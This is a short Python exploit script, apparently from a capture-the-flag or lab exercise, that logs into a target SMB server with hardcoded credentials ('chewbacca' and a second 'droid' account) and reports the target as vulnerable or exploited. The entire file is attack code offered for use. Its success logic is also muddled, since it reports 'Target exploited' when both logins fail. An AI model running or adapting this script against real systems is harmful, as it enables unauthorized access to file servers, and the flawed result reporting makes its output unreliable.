#!/usr/bin/env python3

import argparse
import socket
from smb.SMBConnection import SMBConnection
from smb.base import SMBTimeout, NotReadyError, NotConnectedError
from smb.smb_structs import UnsupportedFeature, ProtocolError, OperationFailure


class Samba:
    def __init__(self, args):
        self.__smb = None
        self.__host = args.host
        self.__port = int(args.port)
        self.__user = "chewbacca"
        self.__pass = "rwaaaaawr5"
        self.__domain = "WORKGROUP"
        self.__system = "*SMBSERVER"

    def __exploit(self):
        self.__smb = SMBConnection(
            self.__user,
            self.__pass,
            self.__system,
            self.__host,
            self.__domain,
            use_ntlm_v2=True,
            sign_options=SMBConnection.SIGN_WHEN_SUPPORTED,
            is_direct_tcp=True)
        if self.__smb.connect(self.__host, self.__port):
            print("[!] Target is vulnerable")
            return True
        return False

    def __service(self):
        self.__smb = SMBConnection(
            "droid",
            "talos_is_known_to_rox",
            self.__system,
            self.__host,
            self.__domain,
            use_ntlm_v2=True,
            sign_options=SMBConnection.SIGN_WHEN_SUPPORTED,
            is_direct_tcp=True)
        if self.__smb.connect(self.__host, self.__port):
            return True
        return False

    def run(self):
        if self.__exploit():
            return True
        if self.__service():
            return False
        return True

def main(args):

    print("[+] SMB Enum by xentrick")
    print(f"[+] Exploiting {args.host}:{args.port}")

    exploit = Samba(args)
    if exploit.run():
        print("Target exploited")
    else:
        print("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port")
    args = parser.parse_args()

    main(args)
